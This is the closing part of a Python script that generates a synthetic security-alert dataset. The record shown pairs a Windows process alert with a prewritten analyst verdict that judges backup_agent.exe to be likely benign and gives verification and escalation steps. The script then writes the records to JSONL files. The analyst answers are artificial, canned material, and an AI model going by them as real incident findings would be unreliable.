        "- backup_agent.exe (PID 3341) — CPU: 18.7%, Path: C:\\Program Files\\BackupSolution\\backup_agent.exe\n\n"
        "Analyze these alerts.",
        "**Verdict: INFO — Likely Scheduled Backup, Verify Path**\n\n"
        "The CPU anomaly and new process are almost certainly explained by each other: "
        "backup_agent.exe is running for the first time in the monitoring window, "
        "triggering both the 'new process' and the baseline deviation.\n\n"
        "backup_agent.exe is running from C:\\Program Files\\BackupSolution\\ — "
        "a legitimate program files path. This is the expected location for third-party software.\n\n"
        "**Assessment**: Almost certainly benign scheduled backup activity.\n\n"
        "**Verification steps**:\n"
        "1. Confirm backup_agent.exe is code-signed: Get-AuthenticodeSignature on the binary\n"
        "2. Check Windows Task Scheduler for the backup task and its configured schedule\n"
        "3. Once confirmed, the process will be added to the baseline and future runs will not alert\n\n"
        "**When to escalate**: If backup_agent.exe is NOT code-signed, or if it's "
        "making unexpected network connections (especially outbound to non-backup-provider IPs).",
        "telemetry", "Info", "Process",
    ),
]


def write_jsonl(path: Path, records: list) -> None:
    with open(path, "w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    print(f"Wrote {len(records)} records to {path}")


if __name__ == "__main__":
    write_jsonl(HERE / "security_events.jsonl", SECURITY_EVENTS)
    write_jsonl(HERE / "telemetry_snapshots.jsonl", TELEMETRY_SNAPSHOTS)
    print("Dataset generation complete.")
